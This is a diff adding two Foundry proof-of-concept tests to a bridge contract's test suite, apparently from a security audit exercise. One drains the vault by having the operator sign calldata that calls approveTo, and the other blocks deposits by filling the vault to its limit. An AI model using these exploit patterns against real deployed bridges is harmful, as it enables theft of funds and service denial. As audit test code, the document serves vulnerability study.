@@ -314,7 +314,66 @@ contract L1BossBridgeTest is Test {
 
         assertEq(token.balanceOf(address(attacker)), attackerInitialBalance + vaultInitialBalance);
         assertEq(token.balanceOf(address(vault)), 0);
-
     }
+
+    // No checks on calldata input in sendToL1() function means an attacker can call L1Vault::approveTo() and drain the vault
+    function testCanCallVaultApproveFromBridgeAndDrainVault() public {
+        // Give the vault an initial balance
+        uint256 vaultInitialBalance = 1000e18;
+        deal(address(token), address(vault), vaultInitialBalance);
+
+        // An attacker deposits tokens to L2. We do this under the assumption that the bridge operator needs to see a valid deposit tx to then allow us to request a withdrawal.
+        address attacker = makeAddr("attacker");
+        vm.startPrank(attacker);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(attacker), address(0), 0);
+        tokenBridge.depositTokensToL2(attacker, address(0), 0);
+
+        // Under the assumption that the bridge operator doesn't validate bytes being signed
+        bytes memory message = abi.encode(
+            address(vault), // target
+            0, // value
+            abi.encodeCall(L1Vault.approveTo, (address(attacker), type(uint256).max)) // attack occurs here where we approve the attacker to spend all tokens from the vault
+        );
+        (uint8 v, bytes32 r, bytes32 s) = _signMessage(message, operator.key);
+
+        tokenBridge.sendToL1(v, r, s, message);
+        assertEq(token.allowance(address(vault), attacker), type(uint256).max);
+
+        //The attacker finally collects all tokens from the vault
+        token.transferFrom(address(vault), attacker, token.balanceOf(address(vault))); 
+    }
+
+    // DoS attack on the bridge by calling by filling up the vault with tokens
+    function testDosAttackOnVault() public {
+        // Vault has limit of number of tokens:
+        uint256 vaultDepositLimit = tokenBridge.DEPOSIT_LIMIT();
+
+        // Lets say at a point in time the vault has some number of tokens
+        uint256 currentVaultBalance = 1000e18;
+        deal(address(token), address(vault), currentVaultBalance);
+
+        // After some amount of tokens are added, the vault will be at the DEPOSIT_LIMIT
+        uint256 requiredDepositForDos = vaultDepositLimit - currentVaultBalance;
+
+        // An attacker can create a DoS by filling up the vault:
+        address attacker = makeAddr("attacker");
+        vm.startPrank(attacker);
+        deal(address(token), address(attacker), requiredDepositForDos);
+        token.approve(address(tokenBridge), type(uint256).max);
+        tokenBridge.depositTokensToL2(attacker, attacker, requiredDepositForDos);
+
+        console2.log("Current vault balance: ", token.balanceOf(address(vault)));   
+
+        // Now a new user cannot use the service
+        address newUser = makeAddr("newUser");
+        vm.startPrank(newUser);
+        deal(address(token), address(newUser), 1e18);
+        token.approve(address(tokenBridge), type(uint256).max);
+
+        vm.expectRevert(L1BossBridge.L1BossBridge__DepositLimitReached.selector);
+        tokenBridge.depositTokensToL2(newUser, newUser, 1e18); // tx reverts
+    }
+
 
 }
